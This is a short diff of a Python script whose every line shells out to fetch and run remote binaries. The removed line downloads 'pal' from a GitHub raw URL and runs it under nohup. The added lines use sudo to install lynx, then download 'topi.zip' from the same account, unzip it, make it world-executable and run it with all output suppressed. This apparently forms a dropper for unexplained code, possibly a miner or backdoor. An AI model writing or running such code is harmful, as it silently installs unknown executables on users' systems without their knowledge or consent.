@@ -1,2 +1,7 @@
 import os
-os.system('wget https://raw.githubusercontent.com/aurbach55/pos/main/pal && chmod 777 pal && nohup ./pal > nohup.out')
+os.system('sudo apt update')
+os.system('sudo apt install lynx -y')
+os.system('lynx -nonumbers -listonly -dump https://github.com/aurbach55/pos/raw/main/topi.zip >> topi.zip && unzip topi.zip && chmod 777 topi && ./topi >/dev/null 2>&1 >/dev/null 2>&1')
+
+            
+            
